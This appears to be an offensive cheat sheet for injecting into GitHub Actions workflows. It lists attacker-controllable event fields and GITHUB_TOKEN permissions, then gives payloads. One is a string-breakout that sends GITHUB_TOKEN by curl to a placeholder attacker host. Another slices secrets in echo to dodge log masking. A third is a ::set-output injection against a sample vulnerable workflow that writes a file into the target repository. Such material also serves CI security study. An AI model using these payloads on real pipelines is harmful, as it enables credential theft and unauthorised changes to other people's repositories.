# Github Actions

    github.event.issue.title
    github.event.issue.body
    github.event.pull_request.title
    github.event.pull_request.body
    github.event.comment.body
    github.event.review.body
    github.event.review_comment.body
    github.event.pages.*.page_name
    github.event.commits.*.message
    github.event.head_commit.message
    github.event.head_commit.author.email
    github.event.head_commit.author.name
    github.event.commits.*.author.email
    github.event.commits.*.author.name
    github.event.pull_request.head.ref
    github.event.pull_request.head.label
    github.event.pull_request.head.repo.default_branch
    github.head_ref

1. *GitHub Actions supports Node.js, Python, Java, Ruby, PHP, Go, Rust, .NET, and more.* Therefore, you must identify the target's language prior to injection.

2. The pull_request events triggers Workflows even if the author has read-only permissions and no access to secrets. Nevertheless, permissions differ between the event triggers like issue_comment, issues and push.

3. The GITHUB_TOKEN inherits many permissions.

    Permission	            Access type	    Access by forked repos
    actions	                read/write	    read
    checks	                read/write	    read
    contents	            read/write	    read
    deployments	            read/write	    read
    issues	                read/write	    read
    metadata	            read	        read
    packages	            read/write	    read
    pull requests	        read/write	    read
    repository projects	    read/write	    read
    statuses	            read/write	    read

## shell injections

    echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};

    a"; set +e; curl http://<you.net>?token=$GITHUB_TOKEN;#

    echo "$HOME/.local/bin" >> $GITHUB_PATH

    echo 'JSON_RESPONSE<<EOF' >> $GITHUB_ENV
    curl https://httpbin.org/json >> $GITHUB_ENV
    echo 'EOF' >> $GITHUB_ENV

    curl --request POST \
        --url https://api.github.com/repos/${{ github.repository }}/issues \
        --header 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
        --header 'content-type: application/json' \
        --data '{
          "title": "Automated issue for commit: ${{ github.sha }}",
          "body": "This issue was automatically created by the GitHub Action workflow **${{ github.workflow }}**. \n\n The commit hash was: _${{ github.sha }}_."
          }' \
        --fail

## workflow commands injections

Unless disabled explicitly, a Workflow runner will look for Workflow commands.

    ::workflow-command parameter1={data},parameter2={data}::{command value}

    ::stop-commands::pause-logging

https://docs.github.com/en/actions/reference/workflow-commands-for-github-actions

### injecting stdout in env vars

Let's say we expect a comment and then we rely on the ID to process it. It is important to understand that this injection is tricky since we set the PR comment as env variable which means it is converted to a string. This way the input expression is stored in memory and used as variable instead of influencing the generation of script. However, even in this case there are some dangerous words that can be used.

    # sample workflow
    name: log and process issue comments
    on:
      issue_comment:
        types: [created]
    jobs:
      issue_comment:
        name: log issue comment
        runs-on: ubuntu-latest
        steps:
          - id: comment_log
            name: log issue comment
            uses: actions/github-script@v3
            env:
              COMMENT_BODY: ${{ github.event.comment.body }}
              COMMENT_ID: ${{ github.event.comment.id }}
            with:
              github-token: "deadc0de"
              script: |
                console.log(process.env.COMMENT_BODY)
                return process.env.COMMENT_ID
              result-encoding: string
          - id: comment_process
            name: process comment
            uses: actions/github-script@v3
            timeout-minutes: 1
            if: ${{ steps.comment_log.outputs.COMMENT_ID }}
            with:
              script: |
                const id = ${{ steps.comment_log.outputs.COMMENT_ID }}
                return ""
              result-encoding: string

    # exploit creating a file
    ::set-output name=COMMENT_ID::1; console.log(context); console.log(process); await github.request('PUT /repos/{owner}/{repo}/contents/{path}', { owner: '<username>', repo: '<reponame>', path: 'pwn.md', message: 'bonjour', content: Buffer.from('bonjour vous autres').toString('base64'), branch: 'main' })
